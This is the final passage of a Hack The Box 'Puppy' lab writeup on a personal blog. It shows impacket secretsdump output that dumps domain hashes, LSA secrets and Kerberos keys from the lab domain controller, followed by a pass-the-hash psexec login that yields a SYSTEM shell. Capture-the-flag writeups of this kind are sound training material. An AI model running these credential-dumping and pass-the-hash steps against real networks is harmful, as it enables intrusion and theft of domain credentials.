</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>sudo secretsdump.py <span class=s2>&#34;puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025\!&#34;</span>@<span class=s2>&#34;dc.puppy.htb&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> razio: 
</span></span><span class=line><span class=cl>Impacket v0.11.0 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping <span class=nb>local</span> SAM hashes <span class=o>(</span>uid:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> SAM hashes extraction <span class=k>for</span> user WDAGUtilityAccount failed. The account doesn<span class=s1>&#39;t have hash information.
</span></span></span><span class=line><span class=cl><span class=s1>[*] Dumping cached domain logon information (domain/username:hash)
</span></span></span><span class=line><span class=cl><span class=s1>[*] Dumping LSA Secrets
</span></span></span><span class=line><span class=cl><span class=s1>[*] $MACHINE.ACC 
</span></span></span><span class=line><span class=cl><span class=s1>PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
</span></span></span><span class=line><span class=cl><span class=s1>PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
</span></span></span><span class=line><span class=cl><span class=s1>PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
</span></span></span><span class=line><span class=cl><span class=s1>PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
</span></span></span><span class=line><span class=cl><span class=s1>PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
</span></span></span><span class=line><span class=cl><span class=s1>[*] DPAPI_SYSTEM 
</span></span></span><span class=line><span class=cl><span class=s1>dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
</span></span></span><span class=line><span class=cl><span class=s1>dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
</span></span></span><span class=line><span class=cl><span class=s1>[*] NL$KM 
</span></span></span><span class=line><span class=cl><span class=s1> 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
</span></span></span><span class=line><span class=cl><span class=s1> 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j&lt;*..&amp;.;..f.z
</span></span></span><span class=line><span class=cl><span class=s1> 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
</span></span></span><span class=line><span class=cl><span class=s1> 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+&#39;</span>V.<span class=se>\k</span>....
</span></span><span class=line><span class=cl>NL<span class=nv>$KM</span>:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
</span></span><span class=line><span class=cl>PUPPY.HTB<span class=se>\l</span>evi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
</span></span><span class=line><span class=cl>PUPPY.HTB<span class=se>\a</span>nt.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
</span></span><span class=line><span class=cl>PUPPY.HTB<span class=se>\a</span>dam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
</span></span><span class=line><span class=cl>PUPPY.HTB<span class=se>\j</span>amie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
</span></span><span class=line><span class=cl>PUPPY.HTB<span class=se>\s</span>teph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
</span></span><span class=line><span class=cl>PUPPY.HTB<span class=se>\s</span>teph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
</span></span><span class=line><span class=cl>DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Kerberos keys grabbed
</span></span><span class=line><span class=cl>Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
</span></span><span class=line><span class=cl>Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up... 
</span></span></code></pre></td></tr></table></div></div><p>And finally, we got a shell as the administrator using the Administrator&rsquo;s hash for the above dump:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl>psexec.py -hashes <span class=s1>&#39;aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b&#39;</span> <span class=s1>&#39;Administrator@dc.puppy.htb&#39;</span>
</span></span><span class=line><span class=cl>Impacket v0.11.0 - Copyright <span class=m>2023</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on dc.puppy.htb.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file PEFrQaPk.exe
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on dc.puppy.htb.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating service sMPL on dc.puppy.htb.....
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting service sMPL.....
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.20348.3453<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt; whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/markdown/>Markdown</a>
<a href=/tags/css/>Css</a>
<a href=/tags/html/>Html</a>
<a href=/tags/themes/>Themes</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/vintage-htb-writeup/><div class=article-image><img src=/p/vintage-htb-writeup/Vintage.c76c8d36bbb5c07a9341e411232aaff4_hu_afa76026b5f92995.png width=250 height=150 loading=lazy alt="Featured image of post Vintage HTB Writeup" data-hash="md5-x2yNNru1wHqTQeQRIyqv9A=="></div><div class=article-details><h2 class=article-title>Vintage HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/certified-htb-writeup/><div class=article-image><img src=/p/certified-htb-writeup/Certified.0c8ab10b3e65480c87e59dfcae1865e4_hu_6fca3ec18ac781dd.png width=250 height=150 loading=lazy alt="Featured image of post Certified HTB Writeup" data-hash="md5-DIqxCz5lSAyH5Z38rhhl5A=="></div><div class=article-details><h2 class=article-title>Certified HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/administrator-htb-writeup/><div class=article-image><img src=/p/administrator-htb-writeup/Administrator.da995b3c283fa5dd82783f9937ba0fb7_hu_24d318bf208d1bdc.png width=250 height=150 loading=lazy alt="Featured image of post Administrator HTB Writeup" data-hash="md5-2plbPCg/pd2CeD+ZN7oPtw=="></div><div class=article-details><h2 class=article-title>Administrator HTB Writeup</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 R4zi0</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>